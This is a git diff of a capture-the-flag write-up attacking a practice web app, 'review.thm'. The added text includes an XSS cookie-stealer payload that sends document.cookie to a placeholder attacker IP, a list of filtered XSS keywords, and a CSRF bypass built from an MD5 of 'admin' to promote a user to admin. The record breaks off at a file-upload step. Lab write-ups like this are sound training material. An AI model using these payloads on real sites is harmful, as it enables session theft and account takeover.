@@ -30,6 +30,9 @@ Heading on over to the website reveals a potential shop which is apparently logi
 ![](./images/img1.png)
 
 The contact page may or may not be susceptible to XSS. Let's send a cookie stealer just in case.
+```
+<img src=x onerror="this.src='http://<attacker ip>:8000/?'+document.cookie;">
+```
 
 We'll come back here in a bit. For now, let's do some subdirectory enumeration. I will be using gobuster for this machine.
 
@@ -81,7 +84,7 @@ Seeing the two PHP files, I decided to restart my gobuster scan with an addition
 
 `chat.php` simply redirects us to the login page and `db.php` returns a blank page.
 
-Speaking of login page, our XSS psayload returned something.
+Speaking of login page, our XSS payload returned something.
 
 ![](./images/img2.png)
 
@@ -89,4 +92,81 @@ Bingo.
 
 ![](./images/img3.png)
 
-Our flag is on the top right.
+Strange how ID #1 is missing. Regardless, our flag is on the top right.
+
+Two interesting finds:
+
+1- the `Chat` page logs us in as the admin and leaks some filter
+
+![](./images/img4.png)
+
+2- the `Settings` page has an option to promote a user to admin
+
+![](./images/img5.png)
+
+(It would be wise to set a new password to maintain persistence)
+
+I put two and two together and figured that maybe we can use the chat to promote our user to admin or at least steal the admins session. Intercepting the `Promote Co-admin` request reveals that it is sending a GET request to `promote_coadmin.php` with a username parameter, as well as a CSRF token.
+
+Looking at the chat source page, I was able to extract the list of banned words: 
+```
+"<script>", "</script>", "onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"
+```
+
+Thing is, however, is that this is a red herring.
+
+the message box treats the text as anything but HTML. However, hyperlinks are rendered. Better yet, when I send a link to my python server, I get requests.
+
+So it's simple. Just send a hyperlink pointing towards `promote_coadmin.php` with the appropriate parameters and we get promoted. Right? Sort of.
+
+The problem is that we don't have the admins CSRF token. So we're stuck again. But, the CSRF token struck me as odd.
+
+For context, here is the CSRF token: `ad148a3ca8bd0ef3b48c52454c493ec5`
+
+
+ad148... Those five characters are familiar. Hell, so was the length. Running the token through a [hash identifier](https://hashes.com/en/tools/hash_identifier), I find that the hash is MD5. Running this hash through [crackstation](https://crackstation.net/):
+
+
+![](./images/img6.png)
+
+Well I'll be. In that case, let's generate our payload:
+
+`$ echo -n "admin" | md5sum`
+
+`http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3`
+
+Going into home:
+
+![](./images/img7.png)
+
+Brilliant.
+
+Logging out and back in shows us the admin front and gives us our second flag:
+
+![](./images/img8.png)
+
+clicking on the drop down menu reveals a "feature" called "lottery". Clicking on it reveals the followings:\
+```
+🎉 Coming Soon!
+
+The Lottery feature is in production and will be launched soon. Stay tuned!
+```
+
+Recall how our earlier enumerations lead us to an email talking about a lottery and a finance panel. This is where it comes into play.
+
+the drop down menu actually just sends a POST request whenever we click on one of the provided selections. In the case of "lottery", it just sends a POST request with the body containing `lottery.php`. Modifying that to request `finance.php` instead:
+
+![](./images/img9.png)
+
+And after putting in the password:
+
+![](./images/img10.png)
+
+Now, I've tried to upload multiple files here, and it kept telling me that each file was uploaded successfully and located in `/uploads`. However, every time I checked, it was empty.
+
+It's possible that there is a filter, or the `/upload` referenced is a different one. But all of this is pure conjecture.
+
+But wait, let's take a closer look:
+
+![](./images/img11.png)
+
